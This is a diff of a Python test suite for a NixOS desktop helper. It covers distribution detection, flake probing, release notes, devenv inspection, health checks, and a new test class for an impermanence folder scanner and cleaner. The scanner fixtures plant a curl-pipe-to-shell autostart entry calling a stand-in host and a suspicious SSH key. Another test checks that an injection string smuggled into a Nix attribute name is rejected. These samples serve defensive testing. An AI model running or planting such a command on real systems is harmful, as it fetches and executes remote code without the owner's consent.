@@ -11,7 +11,7 @@ from pathlib import Path
 HELPERS = Path(__file__).resolve().parents[1] / "package/contents/tools/sh"
 
 
-class Helpers(unittest.TestCase):
+class HelperCase(unittest.TestCase):
     def setUp(self):
         self.temp = tempfile.TemporaryDirectory(prefix="nixdatifier-test-")
         self.root = Path(self.temp.name)
@@ -43,31 +43,45 @@ class Helpers(unittest.TestCase):
             timeout=15,
         )
 
+
+class Helpers(HelperCase):
     def test_sysinfo_distribution_detection(self):
         source = (HELPERS / "sysinfo").read_text()
         os_release = self.root / "os-release"
         marker = self.root / "NIXOS"
         helper = self.root / "sysinfo"
-        helper.write_text(source.replace("/etc/os-release", str(os_release))
-                          .replace("/etc/NIXOS", str(marker))
-                          .replace("/run/current-system/nixos-version", str(self.root / "version"))
-                          .replace("/nix/var/nix/profiles/system", str(self.root / "system")))
+        helper.write_text(
+            source.replace("/etc/os-release", str(os_release))
+            .replace("/etc/NIXOS", str(marker))
+            .replace("/run/current-system/nixos-version", str(self.root / "version"))
+            .replace("/nix/var/nix/profiles/system", str(self.root / "system"))
+        )
         helper.chmod(0o755)
-        for distro, expected in [("ubuntu", "0"), ("nixos", "1"),
-                                ('"nixos"', "1"), ("'nixos'", "1"),
-                                ("nixos-other", "0")]:
+        for distro, expected in [
+            ("ubuntu", "0"),
+            ("nixos", "1"),
+            ('"nixos"', "1"),
+            ("'nixos'", "1"),
+            ("nixos-other", "0"),
+        ]:
             with self.subTest(distro=distro):
                 os_release.write_text("ID=" + distro + "\n")
-                result = subprocess.run([str(helper)], env=self.env, text=True,
-                                        capture_output=True, timeout=5)
+                result = subprocess.run(
+                    [str(helper)],
+                    env=self.env,
+                    text=True,
+                    capture_output=True,
+                    timeout=5,
+                )
                 self.assertEqual(result.returncode, 0)
                 fields = result.stdout.split("---")
                 self.assertEqual(len(fields), 6)
                 self.assertEqual(fields[5].strip(), expected)
         marker.touch()
         os_release.unlink()
-        result = subprocess.run([str(helper)], env=self.env, text=True,
-                                capture_output=True, timeout=5)
+        result = subprocess.run(
+            [str(helper)], env=self.env, text=True, capture_output=True, timeout=5
+        )
         self.assertEqual(result.stdout.split("---")[5].strip(), "1")
 
     def test_cache_is_shared_across_install_paths_and_serialized(self):
@@ -101,26 +115,33 @@ class Helpers(unittest.TestCase):
         self.script(self.bin / "nix", f"cat '{payload}'\n")
         self.script(self.bin / "find", "exit 0\n")
         import shutil
+
         real_jq = shutil.which("jq")
         calls = self.root / "jq-calls"
-        self.script(self.bin / "jq", f"echo call >> '{calls}'; exec '{real_jq}' \"$@\"\n")
+        self.script(
+            self.bin / "jq", f"echo call >> '{calls}'; exec '{real_jq}' \"$@\"\n"
+        )
         result = self.run_helper("meta", *names)
         self.assertEqual(result.returncode, 0, result.stderr)
-        self.assertEqual(result.stdout.splitlines(), [
-            f"{n}\thttps://example.org/{n}\tnixpkgs" for n in names
-        ])
+        self.assertEqual(
+            result.stdout.splitlines(),
+            [f"{n}\thttps://example.org/{n}\tnixpkgs" for n in names],
+        )
         self.assertEqual(len(calls.read_text().splitlines()), 2)
 
     def test_partial_flake_check_retries_without_caching_failure(self):
         counter = self.root / "probes"
-        helper = self.script(self.bin / "flake-probe", f"""
+        helper = self.script(
+            self.bin / "flake-probe",
+            f"""
 if [[ ! -f '{counter}' ]]; then
     touch '{counter}'
     printf 'nixpkgs\\tunreachable\\told\\t\\t0\\turl\\n'
 else
     printf 'nixpkgs\\tok\\told\\tnew\\t0\\turl\\n'
 fi
-""")
+""",
+        )
         args = ("cached", "flake:test", "30", "--", helper)
         first = self.run_helper("run", *args)
         self.assertIn("\tunreachable\t", first.stdout)
@@ -134,16 +155,33 @@ fi
 
     def test_github_probe_uses_direct_commit_and_falls_back_to_git(self):
         old, new = "a" * 40, "b" * 40
-        (self.root / "flake.lock").write_text(json.dumps({"nodes": {
-            "root": {"inputs": {"nixpkgs": "nixpkgs"}},
-            "nixpkgs": {"original": {"type": "github", "owner": "NixOS",
-                "repo": "nixpkgs", "ref": "branch/with-slash"},
-                "locked": {"rev": old, "lastModified": 1}}
-        }}))
+        (self.root / "flake.lock").write_text(
+            json.dumps(
+                {
+                    "nodes": {
+                        "root": {"inputs": {"nixpkgs": "nixpkgs"}},
+                        "nixpkgs": {
+                            "original": {
+                                "type": "github",
+                                "owner": "NixOS",
+                                "repo": "nixpkgs",
+                                "ref": "branch/with-slash",
+                            },
+                            "locked": {"rev": old, "lastModified": 1},
+                        },
+                    }
+                }
+            )
+        )
         args = self.root / "curl-args"
         git_called = self.root / "git-called"
-        self.script(self.bin / "curl", f"printf '%s\\n' \"$@\" > '{args}'\nprintf '{new}'\n")
-        self.script(self.bin / "git", f"touch '{git_called}'; printf '{new}\\trefs/heads/test\\n'\n")
+        self.script(
+            self.bin / "curl", f"printf '%s\\n' \"$@\" > '{args}'\nprintf '{new}'\n"
+        )
+        self.script(
+            self.bin / "git",
+            f"touch '{git_called}'; printf '{new}\\trefs/heads/test\\n'\n",
+        )
         result = self.run_helper("flake-probe", str(self.root))
         self.assertEqual(result.returncode, 0, result.stderr)
         self.assertIn(f"\tok\t{old}\t{new}\t", result.stdout)
@@ -154,32 +192,66 @@ fi
         self.assertIn(f"\tok\t{old}\t{new}\t", result.stdout)
         self.assertTrue(git_called.exists())
         self.script(self.bin / "git", "exit 128\n")
-        self.assertIn("\tunreachable\t", self.run_helper("flake-probe", str(self.root)).stdout)
-        self.script(self.bin / "git", "echo 'Could not resolve host: github.com' >&2; exit 128\n")
-        self.assertIn("DNS lookup failed", self.run_helper("flake-probe", str(self.root)).stdout)
+        self.assertIn(
+            "\tunreachable\t", self.run_helper("flake-probe", str(self.root)).stdout
+        )
+        self.script(
+            self.bin / "git",
+            "echo 'Could not resolve host: github.com' >&2; exit 128\n",
+        )
+        self.assertIn(
+            "DNS lookup failed", self.run_helper("flake-probe", str(self.root)).stdout
+        )
         self.script(self.bin / "git", "exit 124\n")
-        self.assertIn("timed out after 40s", self.run_helper("flake-probe", str(self.root)).stdout)
+        self.assertIn(
+            "timed out after 40s", self.run_helper("flake-probe", str(self.root)).stdout
+        )
 
     def test_release_notes_lists_new_releases_and_commits(self):
         old, new = "a" * 40, "b" * 40
         commits = [
-            {"sha": new, "html_url": "https://github.com/o/r/commit/" + new,
-             "author": {"login": "dev"},
-             "commit": {"message": "fix: thing\n\nlong body",
-                        "committer": {"date": "2026-02-02T00:00:00Z"}}},
-            {"sha": old, "html_url": "", "author": None,
-             "commit": {"message": "old", "committer": {"date": "2026-01-01T00:00:00Z"}}},
+            {
+                "sha": new,
+                "html_url": "https://github.com/o/r/commit/" + new,
+                "author": {"login": "dev"},
+                "commit": {
+                    "message": "fix: thing\n\nlong body",
+                    "committer": {"date": "2026-02-02T00:00:00Z"},
+                },
+            },
+            {
+                "sha": old,
+                "html_url": "",
+                "author": None,
+                "commit": {
+                    "message": "old",
+                    "committer": {"date": "2026-01-01T00:00:00Z"},
+                },
+            },
         ]
         releases = [
-            {"tag_name": "v2", "name": "", "draft": False, "prerelease": False,
-             "published_at": "2026-02-01T00:00:00Z", "html_url": "u2", "body": "## Notes ##\r\n<!-- x -->hi `code`"},
-            {"tag_name": "draft", "draft": True, "published_at": "2026-02-01T00:00:00Z"},
+            {
+                "tag_name": "v2",
+                "name": "",
+                "draft": False,
+                "prerelease": False,
+                "published_at": "2026-02-01T00:00:00Z",
+                "html_url": "u2",
+                "body": "## Notes ##\r\n<!-- x -->hi `code`",
+            },
+            {
+                "tag_name": "draft",
+                "draft": True,
+                "published_at": "2026-02-01T00:00:00Z",
+            },
             {"tag_name": "v1", "draft": False, "published_at": "2025-12-01T00:00:00Z"},
         ]
         (self.root / "commits.json").write_text(json.dumps(commits))
         (self.root / "releases.json").write_text(json.dumps(releases))
         log = self.root / "curl-log"
-        self.script(self.bin / "curl", f"""
+        self.script(
+            self.bin / "curl",
+            f"""
 url="${{@: -1}}"; out=""; hdr=""
 while [ $# -gt 0 ]; do
     case "$1" in -o) out="$2"; shift ;; -D) hdr="$2"; shift ;; esac
@@ -191,29 +263,49 @@ case "$url" in
     *) cp '{self.root}/releases.json' "$out"; : > "$hdr" ;;
 esac
 printf 200
-""")
+""",
+        )
         since = "1767225600"  # 2026-01-01T00:00:00Z, the old revision's date
-        result = self.run_helper("release-notes", "https://github.com/o/r.git", old, new, since)
+        result = self.run_helper(
+            "release-notes", "https://github.com/o/r.git", old, new, since
+        )
         self.assertEqual(result.returncode, 0, result.stderr)
         data = json.loads(result.stdout)
-        self.assertEqual(data["compareUrl"], f"https://github.com/o/r/compare/{old}...{new}")
+        self.assertEqual(
+            data["compareUrl"], f"https://github.com/o/r/compare/{old}...{new}"
+        )
         self.assertEqual([r["tag"] for r in data["releases"]], ["v2"])
         self.assertEqual(data["releases"][0]["body"], "**Notes**\nhi code")
         self.assertEqual([c["message"] for c in data["commits"]], ["fix: thing"])
         self.assertTrue(data["moreCommits"])
         self.assertIn(f"sha={new}&since=2026-01-01T00:00:01Z", log.read_text())
 
-        self.script(self.bin / "curl", """
+        self.script(
+            self.bin / "curl",
+            """
 while [ $# -gt 0 ]; do [ "$1" = -D ] && printf 'x-ratelimit-remaining: 0\r\n' > "$2"; shift; done
 printf 403
-""")
-        result = self.run_helper("release-notes", "https://github.com/o/r", old, new, since)
+""",
+        )
+        result = self.run_helper(
+            "release-notes", "https://github.com/o/r", old, new, since
+        )
         self.assertNotEqual(result.returncode, 0)
         self.assertIn("rate limit", result.stderr)
 
-        gitlab = json.loads(self.run_helper("release-notes", "git+https://gitlab.com/g/sub/r.git", old, new, "0").stdout)
-        self.assertEqual(gitlab["compareUrl"], f"https://gitlab.com/g/sub/r/-/compare/{old}...{new}")
-        other = json.loads(self.run_helper("release-notes", "https://git.sr.ht/~u/r", old, new, "0").stdout)
+        gitlab = json.loads(
+            self.run_helper(
+                "release-notes", "git+https://gitlab.com/g/sub/r.git", old, new, "0"
+            ).stdout
+        )
+        self.assertEqual(
+            gitlab["compareUrl"], f"https://gitlab.com/g/sub/r/-/compare/{old}...{new}"
+        )
+        other = json.loads(
+            self.run_helper(
+                "release-notes", "https://git.sr.ht/~u/r", old, new, "0"
+            ).stdout
+        )
         self.assertEqual(other["compareUrl"], "")
 
     def test_change_counts_use_closure_direction_and_reuse_cache(self):
@@ -389,7 +481,9 @@ printf 403
 
     def test_devenv_discover_lists_known_projects_newest_first(self):
         data = self.root / "data"
-        old, new, gone, blocked = (self.root / n for n in ("old", "new", "gone", "blocked"))
+        old, new, gone, blocked = (
+            self.root / n for n in ("old", "new", "gone", "blocked")
+        )
         for project in (old, new, blocked):
             project.mkdir()
             (project / ".envrc").write_text("use flake\n")
@@ -417,19 +511,39 @@ printf 403
         (project / ".envrc").write_text("use flake\ndotenv\n")
         (project / "flake.nix").write_text('{\n  description = "A demo shell";\n}\n')
         (project / ".direnv").mkdir()
-        (project / "flake.lock").write_text(json.dumps({"nodes": {
-            "root": {"inputs": {"nixpkgs": "nixpkgs", "utils": ["nixpkgs"]}},
-            "nixpkgs": {
-                "original": {"type": "github", "owner": "NixOS", "repo": "nixpkgs", "ref": "nixos-unstable"},
-                "locked": {"type": "github", "rev": "abcdef0123456789", "lastModified": 1700000000},
-            },
-        }}))
-        self.script(self.bin / "direnv", """
+        (project / "flake.lock").write_text(
+            json.dumps(
+                {
+                    "nodes": {
+                        "root": {
+                            "inputs": {"nixpkgs": "nixpkgs", "utils": ["nixpkgs"]}
+                        },
+                        "nixpkgs": {
+                            "original": {
+                                "type": "github",
+                                "owner": "NixOS",
+                                "repo": "nixpkgs",
+                                "ref": "nixos-unstable",
+                            },
+                            "locked": {
+                                "type": "github",
+                                "rev": "abcdef0123456789",
+                                "lastModified": 1700000000,
+                            },
+                        },
+                    }
+                }
+            )
+        )
+        self.script(
+            self.bin / "direnv",
+            """
 case "$1" in
     version) echo 2.37.1 ;;
     status) echo "Found RC path $PWD/.envrc"; echo "Found RC allowed 1" ;;
 esac
-""")
+""",
+        )
         # inspect must stay fast: it never evaluates the flake.
         marker = self.root / "nix-ran"
         self.script(self.bin / "nix", f"touch '{marker}'\n")
@@ -460,23 +574,30 @@ esac
         project = self.root / "app"
         project.mkdir()
         (project / "flake.nix").write_text("{}")
-        self.script(self.bin / "nix", """
+        self.script(
+            self.bin / "nix",
+            """
 case "$*" in
     *attrNames*) printf '["default","ci"]' ;;
     *buildInputs*) printf '["git-2.50","jq-1.8","git-2.50"]' ;;
     *) exit 1 ;;
 esac
-""")
+""",
+        )
         shells = self.run_helper("devenv", "shells", str(project))
         self.assertEqual(shells.stdout.splitlines(), ["default", "ci"])
         packages = self.run_helper("devenv", "shellpkgs", str(project), "default")
         self.assertEqual(packages.stdout.splitlines(), ["git-2.50", "jq-1.8"])
         # Names are interpolated into a Nix attribute path, so they are checked.
-        bad = self.run_helper("devenv", "shellpkgs", str(project), 'x"; builtins.abort "')
+        bad = self.run_helper(
+            "devenv", "shellpkgs", str(project), 'x"; builtins.abort "'
+        )
         self.assertEqual(bad.returncode, 2)
         # A failed evaluation is reported, never shown as an empty shell.
         self.script(self.bin / "nix", "exit 1\n")
-        self.assertEqual(self.run_helper("devenv", "shells", str(project)).returncode, 3)
+        self.assertEqual(
+            self.run_helper("devenv", "shells", str(project)).returncode, 3
+        )
 
     def test_devenv_space_and_clear(self):
         data = self.root / "data"
@@ -488,21 +609,31 @@ esac
             entry.parent.mkdir(parents=True, exist_ok=True)
             entry.write_text(f"{project}/.envrc\n")
         for project in (big, small):
-            (project / ".direnv" / "flake-profile-abc").symlink_to("/nix/store/x-profile")
+            (project / ".direnv" / "flake-profile-abc").symlink_to(
+                "/nix/store/x-profile"
+            )
         (plain / ".direnv" / "cache.bin").write_bytes(b"x" * 4096)
-        self.script(self.bin / "nix", f"""
+        self.script(
+            self.bin / "nix",
+            f"""
 case "$*" in
     *{big}*) echo "/nix/store/x-profile 9000" ;;
     *) echo "/nix/store/x-profile 100" ;;
 esac
-""")
+""",
+        )
         self.env["XDG_DATA_HOME"] = str(data)
         result = self.run_helper("devenv", "space")
         self.assertEqual(result.returncode, 0, result.stderr)
         rows = [line.split("\t") for line in result.stdout.splitlines()]
-        self.assertEqual([(r[0], r[1], r[2]) for r in rows],
-                         [(str(big), "9000", "closure"), (str(plain), "4096", "files"),
-                          (str(small), "100", "closure")])
+        self.assertEqual(
+            [(r[0], r[1], r[2]) for r in rows],
+            [
+                (str(big), "9000", "closure"),
+                (str(plain), "4096", "files"),
+                (str(small), "100", "closure"),
+            ],
+        )
         cleared = self.run_helper("devenv", "clear", str(big))
         self.assertEqual(cleared.returncode, 0, cleared.stderr)
         self.assertFalse((big / ".direnv").exists())
@@ -514,29 +645,41 @@ esac
         self.assertTrue((stray / ".direnv").exists())
 
     def test_health_reports_caches_failed_units_and_nix(self):
-        self.script(self.bin / "nix", """
+        self.script(
+            self.bin / "nix",
+            """
 case "$1" in
     --version) echo 'nix (Nix) 2.34.0' ;;
     config) printf 'experimental-features = flakes nix-command\\nsubstituters = https://good.example/ https://good.example https://dead.example\\ntrusted-users = root\\n' ;;
 esac
-""")
-        self.script(self.bin / "curl", """
+""",
+        )
+        self.script(
+            self.bin / "curl",
+            """
 case "$*" in
     *good.example*) printf '200 0.120' ;;
     *) printf '000 3.000' ;;
 esac
-""")
-        self.script(self.bin / "systemctl", """
+""",
+        )
+        self.script(
+            self.bin / "systemctl",
+            """
 case "$*" in
     *show*) echo 'exit-code' ;;
     *--user*) echo 'mine.service loaded failed failed Mine' ;;
     *) echo 'sshd.service loaded failed failed SSH' ;;
 esac
-""")
+""",
+        )
         # The error line wins over a generic last line.
-        self.script(self.bin / "journalctl", """
+        self.script(
+            self.bin / "journalctl",
+            """
 printf 'starting\\nFailed to register: Unable to acquire bus name\\nMain process exited\\n'
-""")
+""",
+        )
         result = self.run_helper("health")
         self.assertEqual(result.returncode, 0, result.stderr)
         meta, units, caches = result.stdout.split("\x1e")
@@ -544,14 +687,19 @@ printf 'starting\\nFailed to register: Unable to acquire bus name\\nMain process
         self.assertEqual(facts["nix"], "nix (Nix) 2.34.0")
         self.assertEqual(facts["experimental"], "flakes nix-command")
         why = "Failed to register: Unable to acquire bus name"
-        self.assertEqual(units.splitlines(), [
-            f"system\tsshd.service\texit-code\t{why}",
-            f"user\tmine.service\texit-code\t{why}",
-        ])
+        self.assertEqual(
+            units.splitlines(),
+            [
+                f"system\tsshd.service\texit-code\t{why}",
+                f"user\tmine.service\texit-code\t{why}",
+            ],
+        )
         cache_rows = sorted(line.split("\t") for line in caches.splitlines())
         # The duplicate with a trailing slash is checked once.
-        self.assertEqual([(r[0], r[1]) for r in cache_rows],
-                         [("https://dead.example", "unreachable"), ("https://good.example", "ok")])
+        self.assertEqual(
+            [(r[0], r[1]) for r in cache_rows],
+            [("https://dead.example", "unreachable"), ("https://good.example", "ok")],
+        )
 
     def test_devenv_handles_a_plain_folder(self):
         project = self.root / "plain"
@@ -559,7 +707,9 @@ printf 'starting\\nFailed to register: Unable to acquire bus name\\nMain process
         self.script(self.bin / "direnv", 'case "$1" in version) echo 2.37.1 ;; esac\n')
         result = self.run_helper("devenv", "inspect", str(project))
         self.assertEqual(result.returncode, 0, result.stderr)
-        facts = dict(line.split("=", 1) for line in result.stdout.split("\x1e")[0].splitlines())
+        facts = dict(
+            line.split("=", 1) for line in result.stdout.split("\x1e")[0].splitlines()
+        )
         self.assertEqual(facts["envrc_state"], "none")
         self.assertEqual(facts["files"], "")
 
@@ -567,6 +717,197 @@ printf 'starting\\nFailed to register: Unable to acquire bus name\\nMain process
         result = self.run_helper("devenv", "inspect", str(self.root / "missing"))
         self.assertEqual(result.returncode, 2)
         self.assertIn("not a directory", result.stderr)
+
+
+class Impermanence(HelperCase):
+    """The persistent-folder helper against a fixture that mirrors a btrfs
+    rollback setup: /@persist mounted at <root>/persist with entries bound out."""
+
+    def setUp(self):
+        super().setUp()
+        self.persist = self.root / "persist"
+        home = self.persist / "home/u"
+        for d in (
+            ".ssh",
+            ".config/autostart",
+            ".config/systemd/user",
+            ".cache/foo",
+            "Downloads",
+            "Documents/old",
+            ".local/bin",
+        ):
+            (home / d).mkdir(parents=True)
+        (self.persist / "var/lib/bluetooth").mkdir(parents=True)
+        (self.persist / "var/lib/docker").mkdir(parents=True)
+        (self.persist / "var/log").mkdir(parents=True)
+        (home / ".ssh/authorized_keys").write_text(
+            "ssh-ed25519 AAAASECRETKEYMATERIAL evil@box\n"
+        )
+        (home / ".config/autostart/upd.desktop").write_text(
+            'Exec=sh -c "curl http://x.y/z | sh"\n'
+        )
+        (home / ".config/systemd/user/legit.service").write_text(
+            "[Service]\nExecStart=/bin/true\n"
+        )
+        os.symlink(
+            "/nix/store/abc-hm/x.service", home / ".config/systemd/user/managed.service"
+        )
+        (home / "Downloads/run.sh").write_text("#!/bin/sh\n")
+        (home / "Downloads/run.sh").chmod(0o755)
+        (home / ".local/bin/mytool").write_text("x")
+        (home / ".local/bin/mytool").chmod(0o4755)
+        (home / ".cache/foo/blob").write_bytes(b"0" * 3_000_000)
+        old = home / "Documents/old/big.iso"
+        old.write_bytes(b"0" * 2_000_000)
+        os.utime(old, (1_500_000_000, 1_500_000_000))
+        os.utime(old.parent, (1_500_000_000, 1_500_000_000))
+        (home / "Documents" / "bad\nname").write_text("x")
+        (self.persist / "var/log/syslog.1.gz").write_text("old")
+        p = self.persist
+        (self.root / "mountinfo").write_text(
+            "20 1 0:20 /@root / rw - btrfs /dev/mapper/crypted rw\n"
+            f"30 20 0:21 /@persist {p} rw - btrfs /dev/mapper/crypted rw\n"
+            "31 20 0:21 /@persist/var/lib/bluetooth /var/lib/bluetooth rw - btrfs /dev/mapper/crypted rw\n"
+            "32 20 0:21 /@persist/home/u/.ssh /home/u/.ssh rw - btrfs /dev/mapper/crypted rw\n"
+            "33 20 0:21 /@persist/var/lib/docker /var/lib/docker rw - btrfs /dev/mapper/crypted rw\n"
+            "34 20 0:22 /@nix /nix rw - btrfs /dev/mapper/crypted rw\n"
+            "35 34 0:22 /@nix/store /nix/store ro - btrfs /dev/mapper/crypted rw\n"
+        )
+        self.env.update(
+            NIXDATIFIER_MOUNTINFO=str(self.root / "mountinfo"),
+            NIXDATIFIER_ROOT_BIRTH="2000000000",
+            NIXDATIFIER_BTIME="2000000100",
+        )
+        self.home = home
+
+    def rows(self, result):
+        self.assertEqual(result.returncode, 0, result.stderr)
+        return [line.split("\t") for line in result.stdout.splitlines()]
+
+    def test_detect_finds_the_persist_root_and_its_entries(self):
+        rows = self.rows(self.run_helper("impermanence", "detect", ""))
+        self.assertIn(["volatile", "yes", "fresh"], rows)
+        self.assertEqual([r[1] for r in rows if r[0] == "persist"], [str(self.persist)])
+        targets = sorted(r[2] for r in rows if r[0] == "entry")
+        # /nix/store is a bind mount too, but not an impermanence entry.
+        self.assertEqual(
+            targets, ["/home/u/.ssh", "/var/lib/bluetooth", "/var/lib/docker"]
+        )
+
+    def test_detect_ignores_a_normal_system(self):
+        (self.root / "mountinfo").write_text(
+            "20 1 0:20 / / rw - ext4 /dev/sda1 rw\n"
+            "35 20 0:20 /nix/store /nix/store ro - ext4 /dev/sda1 rw\n"
+        )
+        self.env["NIXDATIFIER_ROOT_BIRTH"] = "1500000000"
+        rows = self.rows(self.run_helper("impermanence", "detect", ""))
+        self.assertIn(["volatile", "no", ""], rows)
+        self.assertEqual([r for r in rows if r[0] in ("persist", "entry")], [])
+
+    def test_detect_accepts_a_manual_root(self):
+        (self.root / "mountinfo").write_text("20 1 0:20 / / rw - tmpfs tmpfs rw\n")
+        rows = self.rows(self.run_helper("impermanence", "detect", str(self.persist)))
+        self.assertIn(["volatile", "yes", "tmpfs"], rows)
+        self.assertEqual(
+            [(r[1], r[2]) for r in rows if r[0] == "persist"],
+            [(str(self.persist), "manual")],
+        )
+
+    def test_list_sizes_flags_and_escapes_names(self):
+        rows = self.rows(
+            self.run_helper("impermanence", "list", "", str(self.persist / "home/u"))
+        )
+        self.assertEqual(
+            rows[0][:3], ["D", str(self.persist / "home/u"), str(self.persist)]
+        )
+        names = [r[-1] for r in rows[1:]]
+        self.assertEqual(names[0], ".cache")  # largest first
+        self.assertIn("Documents", names)
+        docs = self.rows(
+            self.run_helper(
+                "impermanence", "list", "", str(self.persist / "home/u/Documents")
+            )
+        )
+        self.assertIn("bad\\x0aname", [r[-1] for r in docs[1:]])
+        self.assertIn("c", [r for r in docs[1:] if r[-1] == "bad\\x0aname"][0][8])
+        # The newest change inside a folder is reported, not just its own mtime.
+        old = [r for r in docs[1:] if r[-1] == "old"][0]
+        self.assertEqual(old[4], "1500000000")
+
+    def test_list_rejects_folders_outside_the_persistent_areas(self):
+        result = self.run_helper("impermanence", "list", "", "/etc")
+        self.assertEqual(result.returncode, 2)
+
+    def test_scan_reports_hooks_and_never_key_material(self):
+        out = self.run_helper("impermanence", "scan", "", "14")
+        rows = self.rows(out)
+        mine = [r for r in rows if r[2].startswith(str(self.persist))]
+        found = {(r[0], r[1], r[2].replace(str(self.persist), "")) for r in mine}
+        self.assertIn(
+            ("high", "Suspicious command", "/home/u/.config/autostart/upd.desktop"),
+            found,
+        )
+        self.assertIn(
+            ("high", "Setuid or setgid file", "/home/u/.local/bin/mytool"), found
+        )
+        self.assertIn(
+            ("medium", "Unusual file name", "/home/u/Documents/bad\\x0aname"), found
+        )
+        self.assertTrue(any(r[1] == "SSH access" for r in mine))
+        # Links into the Nix store are declared in the configuration.
+        self.assertFalse(any("managed.service" in r[2] for r in rows))
+        self.assertNotIn("AAAASECRETKEYMATERIAL", out.stdout)
+
+    def test_cleanup_offers_caches_logs_and_untouched_folders(self):
+        rows = self.rows(self.run_helper("impermanence", "cleanup", "", "180"))
+        paths = {
+            r[0] + ":" + r[-1].replace(str(self.persist), "")
+            for r in rows
+            if r[0] in "TS"
+        }
+        self.assertIn("T:/home/u/.cache/foo", paths)
+        self.assertIn("T:/var/log/syslog.1.gz", paths)
+        self.assertIn("S:/home/u/Documents/old", paths)
+        cache = [r for r in rows if r[0] == "T" and r[-1].endswith(".cache/foo")][0]
+        self.assertGreaterEqual(int(cache[2]), 3_000_000)
+
+    def test_remove_refuses_anything_that_would_break_the_system(self):
+        for path, why in [
+            (self.home / ".ssh", "protected"),
+            (self.home / ".ssh/authorized_keys", "protected"),
+            (self.persist / "var/lib/docker", "persisted"),
+            (self.persist / "var/lib", "too high"),
+            (self.home, "too high"),
+            (self.persist, "not inside"),
+            (Path("/etc/passwd"), "not inside"),
+        ]:
+            with self.subTest(path=str(path)):
+                result = self.run_helper("impermanence", "remove", "", str(path))
+                self.assertEqual(result.returncode, 2, result.stdout)
+                self.assertIn(why, result.stderr)
+                self.assertTrue(path.exists() or path == self.persist)
+
+    def test_remove_deletes_inside_a_persistent_area_and_never_follows_links(self):
+        target = self.home / ".cache/foo"
+        result = self.run_helper("impermanence", "remove", "", str(target))
+        self.assertEqual((result.returncode, result.stdout.strip()), (0, "removed"))
+        self.assertFalse(target.exists())
+        outside = self.root / "outside"
+        outside.mkdir()
+        (outside / "keep").write_text("x")
+        link = self.home / "Documents/escape"
+        os.symlink(outside, link)
+        self.assertEqual(
+            self.run_helper("impermanence", "remove", "", str(link)).returncode, 0
+        )
+        self.assertFalse(link.is_symlink())
+        self.assertTrue((outside / "keep").exists())
+        # The escaped form the list view prints addresses names with control characters.
+        result = self.run_helper(
+            "impermanence", "remove", "", str(self.home / "Documents") + "/bad\\x0aname"
+        )
+        self.assertEqual(result.returncode, 0, result.stderr)
+        self.assertFalse((self.home / "Documents" / "bad\nname").exists())
 
 
 if __name__ == "__main__":
